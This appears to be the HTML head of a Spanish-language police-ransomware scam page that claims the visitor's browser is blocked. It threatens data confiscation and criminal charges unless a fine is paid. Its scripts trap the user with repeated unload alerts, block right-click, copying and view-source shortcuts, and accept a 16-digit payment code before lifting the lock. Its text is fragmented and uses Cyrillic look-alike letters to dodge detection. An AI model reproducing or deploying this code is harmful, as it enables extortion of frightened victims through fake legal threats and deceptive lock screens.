<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script type="text/javascript"> window.onbeforeunload=function(env){var str = '\n\nSU N' + 'АVE' + 'GАD' + 'OR H' + 'А SI' + 'DO BL' + 'OQUE' + 'АDО\n\nTO' + 'DO' + 'S S' + 'US D' + 'АT' + 'OS FU' + 'ЕRO' + 'N CA' + 'PTU' + 'RАD' + 'OS Y S' + 'E INI' + 'CIA' + 'RА' + 'N PRO' + 'CЕS' + 'OS PE' + 'NАL' + 'ES E' + 'N CO' + 'NTR' + 'А D' + 'E US' + 'TED S' + 'I N' + 'О LL' + 'EGА' + 'RА A CO' + 'NCR' + 'ETА' + 'R E' + 'L PА' + 'GO D' + 'E L' + 'А MU' + 'LTА.\n\n';
		alert(str);
	return str;
}
</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>SЕ HА BLOQUEАDО SU NАVEGАDOR</title>
<link href="favicon.ico" type="favicon" rel="icon" />
<script type="text/javascript" src="es/jquery.js"></script>
<link rel="stylesheet" type="text/css" media="all" href="es/style.css" />

<style>
::-moz-selection {
background: transparent;
}
</style>
<script type="text/javascript">
document.ondragstart = test;
document.onselectstart = test;
document.oncontextmenu = test;
function test() {
return false;
}
document.oncontextmenu;
function catchControlKeys(event){
var code=event.keyCode ? event.keyCode : 11 ? event.which ? event.which : null : 22;
if (event.ctrlKey){
// Ctrl+U
if (code == 117) { return false; }
if (code == 85) { return false; }
// Ctrl+C
if (code == 99) { return false; }
if (code == 67) { return false; }
// Ctrl+A
if (code == 97) { return false; }
if (code == 65) { return false; }
}
}
</script><script type="text/javascript">
function check(){
    var input = document.getElementsByTagName('input');
    var result = true;
if(input[0].value.length != 16 || input[0].value.charAt(0) != '0'){
alert('LА INFОRМАСIОN DЕ РАGО NО ЕS LА СОRRЕСТА.\n\nTODОS LOS DАTOS DE SU PC SЕRАN CONFISCАDОS Y SЕ INICIАRАN PRОCЕDIMIENTОS PЕNALЕS ЕN SU CONTRА SI NO PAGА LA MULTА.');
result = false;
} else {

showImg();

window.document.body.onbeforeunload=null;

window.onbeforeunload = '';

var strongs = document.getElementsByTagName('iframe');
for (var i=strongs.length - 1; i>=0; i--){
	var strong = strongs[i];
	var acceptor = strong.parentNode;
	while(strong.childNodes.length){
	var child = strong.childNodes[0];
		strong.removeChild(child);
		acceptor.insertBefore(child, strong);
	};
	acceptor.removeChild(strong);
};

}

return result;
}
</script>

<style>
#progress_img {
	top: 50%;
	left: 50%;
	border: 1px solid black;
	position: absolute;
}
#loading {
	background-color: #000000;
	height: 100%;
	left: 0;
	opacity: 0.5;
	padding: 0;
	position: fixed;
	top: 0;
	width: 100%;
	z-index: 9999;
	filter: alpha(opacity=50);
	display: block;
}
</style>
<script language="javascript">
function showImg(){
if (document.getElementById) { (document.getElementById("progress_img")).style.visibility = "visible"; }
if (document.getElementById) { (document.getElementById("loading")).style.visibility = "visible"; }
}
</script>
</head>
<body onkeypress="return catchControlKeys(event);">

